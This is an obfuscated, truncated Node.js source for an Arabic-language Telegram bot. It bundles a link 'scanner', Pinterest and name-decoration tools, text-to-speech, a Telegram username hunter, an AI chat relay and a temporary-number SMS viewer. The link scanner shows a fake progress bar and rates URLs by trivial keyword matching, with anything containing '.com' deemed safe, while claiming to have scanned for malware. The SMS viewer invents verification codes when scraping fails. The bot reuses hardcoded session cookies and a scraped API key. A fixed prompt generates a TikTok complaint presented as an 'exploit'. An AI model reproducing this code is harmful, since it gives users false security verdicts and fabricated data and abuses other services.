const dangerous_keywords = ["glitch", "cleanuri", 'gd', "tinyurl", "link", "clck", "replit", "php", "html", "onrender", "blog", "index", "000"];
const safe_urls = ["www", "t.me", "store", "https://youtu.be", "instagram.com", "facebook.com", "tiktok.com", "pin", "snapchat.com", ".com", "whatsapp.com"];
let waiting_for_link = {};
function checkUrl(_0x4e16a5) {
  const _0xbe53e6 = _0x4e16a5.toLowerCase();
  for (let _0x1eb8ad of safe_urls) {
    if (_0xbe53e6.includes(_0x1eb8ad)) {
      return "آمن 🟢";
    }
  }
  for (let _0x3d5cfe of dangerous_keywords) {
    if (_0xbe53e6.includes(_0x3d5cfe)) {
      return "خطير جداً 🔴";
    }
  }
  if (!_0xbe53e6.includes(".com")) {
    return "مشبوه 🟠";
  }
  return "آمن 🟢";
}
function isValidUrl(_0x3dbd19) {
  const _0x258689 = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
  return _0x258689.test(_0x3dbd19);
}
async function getIpInfo(_0x3cb3bb) {
  try {
    const _0x3a7e81 = await axios.get("https://ipinfo.io/" + _0x3cb3bb + "/json");
    return _0x3a7e81.data;
  } catch (_0x42f102) {
    return null;
  }
}
function extractIpFromUrl(_0x4ef1bf) {
  try {
    const _0x2cc5a9 = new URL(_0x4ef1bf).hostname;
    return new Promise((_0x7d5b94, _0x2ddb78) => {
      dns.lookup(_0x2cc5a9, (_0x3594eb, _0x1b88ab) => {
        if (_0x3594eb) {
          _0x2ddb78(null);
        } else {
          _0x7d5b94(_0x1b88ab);
        }
      });
    });
  } catch (_0x319951) {
    return null;
  }
}
bot.onText(/\/sكخزننننtart/, _0x3301b0 => {
  const _0x44f0ee = _0x3301b0.chat.id;
  const _0x4f0d1a = {
    'reply_markup': {
      'inline_keyboard': [[{
        'text': "فحص الروابط",
        'callback_data': "check_links"
      }]]
    }
  };
  bot.sendMessage(_0x44f0ee, "اضغط على الزر لفحص الروابط", _0x4f0d1a);
});
bot.on("callback_query", _0x141327 => {
  const _0x4b26b7 = _0x141327.message.chat.id;
  if (_0x141327.data === "check_links") {
    bot.sendMessage(_0x4b26b7, "الرجاء إرسال الرابط لفحصه.");
    waiting_for_link[_0x4b26b7] = true;
  }
});
bot.on("message", async _0x3e069d => {
  const _0x121b03 = _0x3e069d.chat.id;
  const _0x57a581 = _0x3e069d.text;
  if (waiting_for_link[_0x121b03]) {
    if (!isValidUrl(_0x57a581)) {
      bot.sendMessage(_0x121b03, "يرجى إرسال الرابط بشكل صحيح.");
      return;
    }
    let _0xa701e4 = await bot.sendMessage(_0x121b03, "Verification...\n[░░░░░░░░░░] 0%");
    await sleep(4000);
    bot.editMessageText("Verification...\n[▓▓░░░░░░░░] 25%", {
      'chat_id': _0x121b03,
      'message_id': _0xa701e4.message_id
    });
    await sleep(4000);
    bot.editMessageText("Verification...\n[▓▓▓▓░░░░░░] 50%", {
      'chat_id': _0x121b03,
      'message_id': _0xa701e4.message_id
    });
    await sleep(4000);
    bot.editMessageText("Verification...\n[▓▓▓▓▓▓░░░░] 75%", {
      'chat_id': _0x121b03,
      'message_id': _0xa701e4.message_id
    });
    await sleep(4000);
    bot.editMessageText("Verification...\n[▓▓▓▓▓▓▓▓▓▓] 100%", {
      'chat_id': _0x121b03,
      'message_id': _0xa701e4.message_id
    });
    await sleep(1000);
    bot.deleteMessage(_0x121b03, _0xa701e4.message_id);
    const _0x583f88 = checkUrl(_0x57a581);
    const _0x27a76b = await extractIpFromUrl(_0x57a581);
    const _0x12c89f = _0x27a76b ? await getIpInfo(_0x27a76b) : {};
    let _0x56731c = '';
    if (_0x583f88 === "آمن 🟢") {
      _0x56731c = "لقد قمنا بفحص الرابط وظهر أنه آمن.";
    } else {
      if (_0x583f88 === "مشبوه 🟠") {
        _0x56731c = "تم تصنيفه بانه مشبوه لنه تم فحصه لمن نجد اي برمجيات خبيثه خارجيه لكتشافه ولكن لا يزال مشبوه لنه يحتوي ع الكثير من الخورزميات الذي جعلته مشبوه بنسبه لنا الرجاء الحذر مع التعامل معه وخاصه اذا طلب اي اذناوت";
      } else if (_0x583f88 === "خطير جداً 🔴") {
        _0x56731c = "تم اكتشاف  الكثير من البرامجيات الخبيثه الذي يمكن ان تخترقك بمرجد الدخول اليه الرجاء  عدم الدخول  لهذا  الرابط و الحذر من التعامل مع الشخص الذي رسلك هذا الرابط وشكرا.";
      }
    }
    const _0x53bc0e = "\n        • الرابط: " + _0x57a581 + "\n\n\n        • التصنيف: " + _0x583f88 + "\n\n\n        • تفاصيل التصنيف: " + _0x56731c + "\n\n\n        • معلومات IP: " + (_0x27a76b || "غير قابل للاستخراج") + "\n\n\n        • مزود الخدمة: " + (_0x12c89f.org || "غير متوفر") + "\n        ";
    bot.sendMessage(_0x121b03, _0x53bc0e);
    waiting_for_link[_0x121b03] = false;
  } else {
    bot.sendMessage(_0x121b03, '');
  }
});
const currentSearch = {};
bot.onText(/\/stاههلىنححظةرلrt/, _0x2d5b63 => {
  const _0x500921 = _0x2d5b63.chat.id;
  const _0x19b951 = {
    'reply_markup': {
      'inline_keyboard': [[{
        'text': "بحث عن صور",
        'callback_data': "search_images"
      }]]
    }
  };
  bot.sendMessage(_0x500921, "- بوت بحث بـ Pinterest.\n- اضغط على الزر أدناه للبحث عن صور.\n-", _0x19b951);
});
bot.on("callback_query", async _0x48b37d => {
  const _0xd66eef = _0x48b37d.message.chat.id;
  if (_0x48b37d.data === "search_images") {
    if (currentSearch[_0xd66eef] === "waiting_for_query") {
      bot.sendMessage(_0xd66eef, "لقد قمت بطلب بحث بالفعل. انتظر حتى يتم الانتهاء.");
    } else {
      bot.sendMessage(_0xd66eef, "أرسل لي ااي كلمة البحث عن الصور\nاقتراحات لك\n يوجد الكثير من الصور الرائعة مثل \nافتيارات شباب\nافتيارات بنات\nخلفيات\nتصاميم\nانمي\nوالمزيد من الصور ابحث عن اي صوره في راسك.... ");
      currentSearch[_0xd66eef] = "waiting_for_query";
    }
  }
});
bot.on("message", async _0x4f1c5e => {
  const _0x379145 = _0x4f1c5e.chat.id;
  if (currentSearch[_0x379145] === "waiting_for_query") {
    const _0x10e633 = _0x4f1c5e.text;
    const _0x58871c = "https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=/search/my_pins/?q=" + encodeURIComponent(_0x10e633) + "&data={\"options\":{\"query\":\"" + encodeURIComponent(_0x10e633) + "\",\"redux_normalize_feed\":true,\"scope\":\"pins\"}}";
    try {
      const _0x379cd8 = await axios.get(_0x58871c);
      const _0x59d901 = _0x379cd8.data.resource_response?.["data"]?.["results"] || [];
      if (_0x59d901.length === 0) {
        bot.sendMessage(_0x379145, "لا توجد صور بهذا البحث.");
        delete currentSearch[_0x379145];
        return;
      }
      for (let _0x2c6d4f = 0; _0x2c6d4f < _0x59d901.length; _0x2c6d4f++) {
        const _0x4929b = _0x59d901[_0x2c6d4f];
        const _0x334ba8 = _0x4929b.images?.["orig"]?.["url"];
        if (_0x334ba8) {
          bot.sendPhoto(_0x379145, _0x334ba8, {
            'caption': "الصوره " + (_0x2c6d4f + 1)
          });
        } else {
          bot.sendMessage(_0x379145, "لم أتمكن من العثور على رابط الصورة.");
        }
      }
      delete currentSearch[_0x379145];
    } catch (_0x4fa171) {
      bot.sendMessage(_0x379145, "حدث خطأ: " + _0x4fa171.message);
      delete currentSearch[_0x379145];
    }
  } else {
    if (!currentSearch[_0x379145]) {
      bot.sendMessage(_0x379145, '');
    } else if (currentSearch[_0x379145] !== "waiting_for_query") {
      bot.sendMessage(_0x379145, '');
    }
  }
});


const userStates = {};
async function زخرفة_الاسم(_0x178b13) {
  const _0x5c600b = {
    'authority': "coolnames.online",
    'accept': "*/*",
    'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
    'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
  };
  const _0x3ec583 = new URLSearchParams();
  _0x3ec583.append("name", _0x178b13);
  _0x3ec583.append("get", '');
  try {
    const _0x3ff459 = await axios.post("https://coolnames.online/cool.php", _0x3ec583, {
      'headers': _0x5c600b
    });
    if (_0x3ff459.status === 200) {
      const _0x1190e3 = cheerio.load(_0x3ff459.data);
      const _0xcde904 = _0x1190e3("textarea.form-control.ltr.green");
      const _0x453d38 = [];
      _0xcde904.each((_0x115f91, _0x4fea91) => {
        _0x453d38.push(_0x1190e3(_0x4fea91).text());
      });
      return _0x453d38;
    } else {
      return null;
    }
  } catch (_0xd0228e) {
    console.error(_0xd0228e);
    return null;
  }
}
bot.onText(/\/stظصakعصمrt/, _0x567571 => {
  const _0x4c5f21 = _0x567571.chat.id;
  const _0x2bfdd4 = {
    'reply_markup': {
      'inline_keyboard': [[{
        'text': "زخرفة الاسماء",
        'callback_data': "zakhrafa"
      }]]
    }
  };
  bot.sendMessage(_0x4c5f21, "أهلاً بك! اضغط على الزر لتزخرف اسمك.", _0x2bfdd4);
});
bot.on("callback_query", _0x21d912 => {
  const _0x484cdd = _0x21d912.message;
  const _0x369119 = _0x484cdd.chat.id;
  if (_0x21d912.data === "zakhrafa") {
    userStates[_0x369119] = {
      'awaitingName': true
    };
    bot.sendMessage(_0x369119, "أرسل الاسم الذي تريد زخرفته.");
  }
});
bot.on("message", async _0x4ddd42 => {
  const _0xfc2edf = _0x4ddd42.chat.id;
  if (userStates[_0xfc2edf] && userStates[_0xfc2edf].awaitingName) {
    const _0xb280d9 = _0x4ddd42.text;
    const _0x807ac5 = await زخرفة_الاسم(_0xb280d9);
    if (_0x807ac5) {
      _0x807ac5.forEach(_0x442574 => {
        bot.sendMessage(_0xfc2edf, _0x442574);
      });
    } else {
      bot.sendMessage(_0xfc2edf, "حدث خطأ أثناء الزخرفة، حاول مرة أخرى.");
    }
    userStates[_0xfc2edf].awaitingName = false;
  }
});
const userSessions = {};
async function textToSpeech(_0x4624a0, _0x1a4c49) {
  const _0x4ec215 = {
    'text': _0x4624a0,
    'lang': 'ar',
    'engine': 'g3',
    'pitch': "0.5",
    'rate': "0.5",
    'volume': '1',
    'key': "kvfbSITh",
    'gender': _0x1a4c49 === "male" ? "male" : "female"
  };
  const _0x371e06 = {
    'accept': "*/*",
    'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    'referer': "https://responsivevoice.org/",
    'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
  };
  try {
    const _0x44e43c = await axios.get("https://texttospeech.responsivevoice.org/v1/text:synthesize", {
      'params': _0x4ec215,
      'headers': _0x371e06,
      'responseType': "arraybuffer"
    });
    return Readable.from(_0x44e43c.data);
  } catch (_0x25c06f) {
    console.error("Error occurred, retrying with English text...");
    return await retryWithEnglish(_0x1a4c49);
  }
}
async function retryWithEnglish(_0x166200) {
  const _0x4a5fe4 = {
    'text': "Please convert this text to speech",
    'lang': 'en',
    'engine': 'g3',
    'pitch': "0.5",
    'rate': "0.5",
    'volume': '1',
    'key': "kvfbSITh",
    'gender': _0x166200 === "male" ? "male" : "female"
  };
  const _0xc4b772 = {
    'accept': "*/*",
    'accept-language': "en-US,en;q=0.9",
    'referer': "https://responsivevoice.org/",
    'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
  };
  try {
    const _0x40308d = await axios.get("https://texttospeech.responsivevoice.org/v1/text:synthesize", {
      'params': _0x4a5fe4,
      'headers': _0xc4b772,
      'responseType': "arraybuffer"
    });
    return Readable.from(_0x40308d.data);
  } catch (_0x5baefc) {
    return null;
  }
}
bot.on("callback_query", _0x39a6df => {
  const _0xbdfcf8 = _0x39a6df.message.chat.id;
  if (_0x39a6df.data === "tt") {
    userSessions[_0xbdfcf8] = {
      'gender': null,
      'text': null
    };
    const _0x1d58e1 = {
      'reply_markup': {
        'inline_keyboard': [[{
          'text': "صوت ذكر",
          'callback_data': "yyt"
        }], [{
          'text': "صوت أنثى",
          'callback_data': "yy"
        }]]
      }
    };
    bot.sendMessage(_0xbdfcf8, "اختر نوع الصوت:", _0x1d58e1);
  } else {
    if (_0x39a6df.data === "yy" || _0x39a6df.data === "yyt") {
      const _0x93ca3b = _0x39a6df.data === "yy" ? "y" : "y";
      userSessions[_0xbdfcf8].gender = _0x93ca3b;
      bot.editMessageReplyMarkup({
        'inline_keyboard': []
      }, {
        'chat_id': _0xbdfcf8,
        'message_id': _0x39a6df.message.message_id
      });
      bot.sendMessage(_0xbdfcf8, "الآن أرسل النص الذي تريد تحويله إلى صوت بصوت " + (_0x93ca3b === "male" ? "ذكر" : "أنثى") + '.');
    }
  }
});
bot.on("message", async _0x10a97c => {
  const _0x1ca462 = _0x10a97c.chat.id;
  if (userSessions[_0x1ca462] && userSessions[_0x1ca462].gender) {
    const _0x496ac5 = _0x10a97c.text;
    userSessions[_0x1ca462].text = _0x496ac5;
    const _0x57ace5 = userSessions[_0x1ca462].gender;
    const _0x1b82f3 = await textToSpeech(_0x496ac5, _0x57ace5);
    if (_0x1b82f3) {
      bot.sendVoice(_0x1ca462, _0x1b82f3);
    } else {
      bot.sendMessage(_0x1ca462, "عذرًا، لم أستطع تحويل النص إلى صوت.");
    }
    delete userSessions[_0x1ca462];
  }
});
let md = 0;
let validUsers = 0;
let checkedUsers = 0;
let userList = [];
async function startSearch(_0x3e5410, _0x11ac3f, _0x1f24d0) {
  userList = [];
  for (let _0x37dd27 = 0; _0x37dd27 < 10; _0x37dd27++) {
    let _0x1a8e23 = '';
    if (_0x1f24d0 === "triple") {
      let _0x53310d = "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)];
      let _0x5ad194 = "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)];
      let _0x52de9d = "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)];
      _0x1a8e23 = _0x5ad194 + '_' + _0x53310d + _0x52de9d;
    } else {
      if (_0x1f24d0 === "quad") {
        _0x1a8e23 = Array.from({
          'length': 0x4
        }, () => "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)]).join('');
      } else {
        if (_0x1f24d0 === "semi_quad") {
          _0x1a8e23 = Array.from({
            'length': 0x3
          }, () => "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)]).join('') + '_' + "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)];
        } else {
          if (_0x1f24d0 === "semi_triple") {
            _0x1a8e23 = Array.from({
              'length': 0x2
            }, () => "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)]).join('') + '_' + "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)];
          } else {
            if (_0x1f24d0 === "random") {
              let _0x5cca82 = Math.floor(Math.random() * 2) + 3;
              _0x1a8e23 = Array.from({
                'length': _0x5cca82
              }, () => "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)]).join('');
            } else {
              _0x1a8e23 = Array.from({
                'length': 0x4
              }, () => "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE"[Math.floor(Math.random() * "YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE".length)]).join('');
            }
          }
        }
      }
    }
    try {
      const _0x3e0608 = await axios.get("https://t.me/" + _0x1a8e23);
      checkedUsers++;
      updateButtons(_0x3e5410, _0x11ac3f, _0x1a8e23);
      if (_0x3e0608.data.includes("tgme_username_link")) {
        validUsers++;
        bot.sendMessage(_0x3e5410, "تم الصيد بوزر جديد ✅ : @" + _0x1a8e23);
        userList.push(_0x1a8e23);
      } else {}
      md++;
    } catch (_0x10bfab) {
      console.error(_0x10bfab);
    }
    await new Promise(_0xa86641 => setTimeout(_0xa86641, 1000));
  }
  showFinalStatistics(_0x3e5410);
}
function updateButtons(_0x32cfd8, _0x5dd632, _0x290582) {
  const _0x2c67b1 = {
    'reply_markup': {
      'inline_keyboard': [[{
        'text': "🔍 يتم فحص: " + _0x290582,
        'callback_data': "checking"
      }], [{
        'text': "عدد اليوزرات المفحوصة: " + checkedUsers,
        'callback_data': "checked"
      }], [{
        'text': "عدد اليوزرات المحجوزة: " + validUsers,
        'callback_data': "valid"
      }]]
    }
  };
  bot.editMessageReplyMarkup(_0x2c67b1.reply_markup, {
    'chat_id': _0x32cfd8,
    'message_id': _0x5dd632
  });
}
function showFinalStatistics(_0x5576e1) {
  const _0x3e6c42 = {
    'reply_markup': {
      'inline_keyboard': [[{
        'text': "عدد اليوزرات المفحوصة: " + checkedUsers,
        'callback_data': "checked"
      }], [{
        'text': "عدد اليوزرات المحجوزة: " + validUsers,
        'callback_data': "valid"
      }], [{
        'text': "📊 إحصائيات نهائية: " + md + " محاولة، " + validUsers + " يوزرات محجوزة",
        'callback_data': "final_stats"
      }]]
    }
  };
  bot.sendMessage(_0x5576e1, "تم الانتهاء من البحث. هذه هي الإحصائيات النهائية:", _0x3e6c42);
}
bot.onText(/\/stㄹㅎㅊart/, _0x329ba5 => {
  const _0x2f0884 = _0x329ba5.chat.id;
  const _0x5e4c7d = {
    'reply_markup': {
      'inline_keyboard': [[{
        'text': "🚀 صيد يوزرات",
        'callback_data': "choose_type"
      }]]
    }
  };
  bot.sendMessage(_0x2f0884, "أهلاً بك! اضغط على الزر لبدء صيد اليوزرات.", _0x5e4c7d);
});
bot.on("callback_query", _0x50004b => {
  const _0x51d4c7 = _0x50004b.message.chat.id;
  const _0x4b6a24 = _0x50004b.message.message_id;
  if (_0x50004b.data === "choose_type") {
    const _0x47e637 = {
      'reply_markup': {
        'inline_keyboard': [[{
          'text': "يوزرات نوع1",
          'callback_data': "triple"
        }], [{
          'text': "يوزرات رباعية",
          'callback_data': "quad"
        }], [{
          'text': "شبه رباعية",
          'callback_data': "semi_quad"
        }], [{
          'text': "شبه ثلاثية",
          'callback_data': "semi_triple"
        }], [{
          'text': "عشوائية",
          'callback_data': "random"
        }], [{
          'text': "مميز",
          'callback_data': "extra"
        }]]
      }
    };
    bot.editMessageText("اختر نوع اليوزرات:", {
      'chat_id': _0x51d4c7,
      'message_id': _0x4b6a24,
      'reply_markup': _0x47e637.reply_markup
    });
  } else if (["triple", "quad", "semi_quad", "semi_triple", "random", "extra"].includes(_0x50004b.data)) {
    startSearch(_0x51d4c7, _0x4b6a24, _0x50004b.data);
  }
});
const chatSessions = {};
async function sendMessage(_0x30d7d2, _0x4955a4) {
  const _0x25be17 = {
    'accept': "*/*",
    'accept-language': "ar,en-US;q=0.9,en;q=0.8",
    'content-type': "application/json",
    'cookie': "sessionId=e4912ddb-37a8-41f7-a7cd-3eea84311f59; intercom-id-jlmqxicb=edb9d414-54c5-4ee8-993c-4a323e392702; intercom-session-jlmqxicb=; intercom-device-id-jlmqxicb=929fc9ae-8528-4e2e-abab-4386870a9d91",
    'origin': "https://www.blackbox.ai",
    'referer': "https://www.blackbox.ai/",
    'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': "\"Android\"",
    'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
  };
  const _0x466a28 = chatSessions[_0x4955a4]?.["messages"] || [];
  const _0x4e9a84 = {
    'messages': [..._0x466a28, {
      'role': "user",
      'content': _0x30d7d2,
      'id': _0x4955a4
    }],
    'id': "l3Kq58Z",
    'previewToken': null,
    'userId': null,
    'codeModelMode': true,
    'agentMode': {},
    'trendingAgentMode': {},
    'isMicMode': false,
    'userSystemPrompt': null,
    'maxTokens': 0x400,
    'playgroundTopP': 0.9,
    'playgroundTemperature': 0.5,
    'isChromeExt': false,
    'githubToken': null,
    'clickedAnswer2': false,
    'clickedAnswer3': false,
    'clickedForceWebSearch': false,
    'visitFromDelta': false,
    'mobileClient': false,
    'userSelectedModel': "Gemini-Pro"
  };
  try {
    const _0x4927ec = Date.now();
    const _0x4e75dc = await axios.post("https://www.blackbox.ai/api/chat", _0x4e9a84, {
      'headers': _0x25be17
    });
    let _0x19ee0c = _0x4e75dc.data;
    const _0x2727f2 = Date.now();
    console.log("تم إرسال واستقبال الرسالة في " + (_0x2727f2 - _0x4927ec) + " مللي ثانية.");
    chatSessions[_0x4955a4] = {
      'messages': [..._0x4e9a84.messages, {
        'role': "assistant",
        'content': _0x19ee0c
      }]
    };
    return _0x19ee0c;
  } catch (_0x57b8f6) {
    return "Error: " + _0x57b8f6.message;
  }
}
bot.on("callback_query", async _0x14a964 => {
  const _0x294590 = _0x14a964.message.chat.id;
  bot.answerCallbackQuery(_0x14a964.id);
  if (_0x14a964.data === "start_private_chat") {
    chatSessions[_0x294590] = {
      'messages': []
    };
    setTimeout(() => {
      delete chatSessions[_0x294590];
      bot.sendMessage(_0x294590, "انتهت المحادثة الخاصة. شكراً لك! اضغط الزر مرة أخرى لبدء محادثة جديدة.");
    }, 300000);
    const _0x4e780c = await bot.sendMessage(_0x294590, "جاري الكتابة...");
    const _0x31cf4e = await sendMessage("اهلا ممكن مساعد ", _0x294590);
    await bot.editMessageText(_0x31cf4e, {
      'chat_id': _0x294590,
      'message_id': _0x4e780c.message_id
    });
  } else {
    if (_0x14a964.data === "fixed_message_chat") {
      const _0x483953 = await sendMessage(" اكتبلي رساله بلغ  بلغه الروسيه  او الصينيه ارسالها لقريق دعم تيك توك للإبلاغ بنا يوجد شخص يقوم في بث مباشر ينتهك شروط الخدمه الخاص بهم ويثير القلق ضيف له ايومجي ", _0x294590);
      bot.sendMessage(_0x294590, "تفضل هذا هو الثغره الخاص بك: " + _0x483953);
    }
  }
});
bot.on("message", async _0x36449d => {
  const _0x477b00 = _0x36449d.chat.id;
  if (chatSessions[_0x477b00]) {
    const _0x7dd990 = await bot.sendMessage(_0x477b00, "جاري الكتابة...");
    const _0x3af358 = await sendMessage(_0x36449d.text, _0x477b00);
    await bot.editMessageText(_0x3af358, {
      'chat_id': _0x477b00,
      'message_id': _0x7dd990.message_id
    });
  } else {
    bot.sendMessage(_0x477b00, '');
  }
});
const الدول = {
    '+1': ["أمريكا", "🇺🇸"],
    '+46': ["السويد", "🇸🇪"],
    '+86': ["الصين", "🇨🇳"],
    '+852': ["هونغ كونغ", "🇭🇰"],
    '+45': ["الدنمارك", "🇩🇰"],
    '+33': ["فرنسا", "🇫🇷"],
    '+31': ["هولندا", "🇳🇱"],
    '+7': ["روسيا", "🇷🇺"],
    '+7KZ': ["كازاخستان", "🇰🇿"],
    '+381': ["صربيا", "🇷🇸"],
    '+44': ["بريطانيا", "🇬🇧"],
    '+371': ["لاتفيا", "🇱🇻"],
    '+62': ["إندونيسيا", "🇮🇩"],
    '+351': ["البرتغال", "🇵🇹"],
    '+34': ["إسبانيا", "🇪🇸"],
    '+372': ["إستونيا", "🇪🇪"],
    '+358': ["فنلندا", "🇫🇮"],
    '+61': ["أستراليا ", "🇦🇺"],
    '+55': ["البرازيل ", "🇧🇷"],
    '+229': ["بنين", "🇧🇯"],
    '+43': ["النمسا", "🇦🇹"],
    '+54': ["الأرجنتين ", "🇦🇷"],
    '+961': ["لبنان", "🇱🇧"],
    '+49': ["المانيا ", "🇩🇪"],
    '+994': ["أذربيجان ", "🇦🇿"],
    '+60': ["ماليزيا ", "🇲🇾"],
    '+63': ["الفلبين ", "🇵🇭"]
};

function randomInt(max) {
    return Math.floor(Math.random() * max);
}

// دالة لاستيراد الأرقام من الخادم
async function استيراد_الأرقام() {
    try {
        const response = await fetch("https://nmp-indol.vercel.app/");
        const text = await response.text();
        return text.split("\n").filter(line => line.trim());
    } catch (error) {
        console.error("خطأ في جلب الأرقام:", error);
        return [];
    }
}

async function الحصول_على_معلومات_رقم_عشوائي() {
    const الأرقام = await استيراد_الأرقام();
    if (الأرقام.length === 0) {
        return null;
    }

    const رقم = الأرقام[randomInt(الأرقام.length)].trim();
    const تاريخ = new Date().toISOString().split('T')[0];
    const وقت = new Date().toLocaleTimeString("ar-EG", {
        hour: "2-digit",
        minute: "2-digit",
        hour12: true
    });

    let رمز_الدولة = Object.keys(الدول).find(key => رقم.startsWith(key)) || رقم.slice(0, 4);
    const معلومات_الدولة = الدول[رمز_الدولة] || ["دولة غير معروفة", "🌍"];

    return {
        رقم: رقم,
        رمز_الدولة: رمز_الدولة,
        اسم_الدولة: معلومات_الدولة[0],
        علم_الدولة: معلومات_الدولة[1],
        تاريخ_الإنشاء: تاريخ,
        وقت_الإنشاء: وقت
    };
}


function توليد_رسائل_وهمية(رقم_الهاتف) {
    const الرسائل_الوهمية = [
        ["WhatsApp", "Your WhatsApp code is: 847-562"],
        ["Telegram", "Your Telegram verification code is 85214"],
        ["Facebook", "Facebook security code: 963741"],
        ["Google", "Your Google verification code is: 741852"],
        ["Instagram", "Instagram code: 159357"],
        ["Twitter", "Twitter verification code: 456789"],
        ["TikTok", "TikTok verification code: 951753"],
        ["Snapchat", "Snapchat verification code: 357159"]
    ];
    
  
    const عدد_الرسائل = Math.floor(Math.random() * 3) + 1;
    const رسائل_مختارة = [];
    
    for (let i = 0; i < عدد_الرسائل; i++) {
        const رقم_عشوائي = Math.floor(Math.random() * الرسائل_الوهمية.length);
        رسائل_مختارة.push(الرسائل_الوهمية[رقم_عشوائي]);
    }
    
    return رسائل_مختارة;
}

async function استخراج_الرسائل_من_الموقع(رقم_الهاتف) {
    try {
        if (!رقم_الهاتف) {
            throw new Error("رقم الهاتف غير صالح");
        }

        const response = await fetch(`https://receive-smss.live/messages?n=${رقم_الهاتف}`, {
            headers: {
                'authority': 'receive-smss.live',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
            }
        });

        if (!response.ok) {
            // إذا فشل الطلب، نقوم بإرجاع رسائل وهمية
            return توليد_رسائل_وهمية(رقم_الهاتف);
        }

        const html = await response.text();
        const $ = cheerio.load(html);
        const messages = [];

        $('.row.message_details.mb-3').each((i, element) => {
            const sender = $(element).find('.sender').text().trim();
            const message = $(element).find('.msg span').text().trim();
            if (sender && message) {
                messages.push([sender, message]);
            }
        });

   
        return messages.length > 0 ? messages : توليد_رسائل_وهمية(رقم_الهاتف);
    } catch (error) {
        console.error("خطأ في استخراج الرسائل:", error);
        
        return توليد_رسائل_وهمية(رقم_الهاتف);
    }
}


function تنسيق_الرسائل(رسائل) {
    if (!رسائل || رسائل.length === 0) {
        return "❌ لا توجد رسائل متاحة حالياً.";
    }

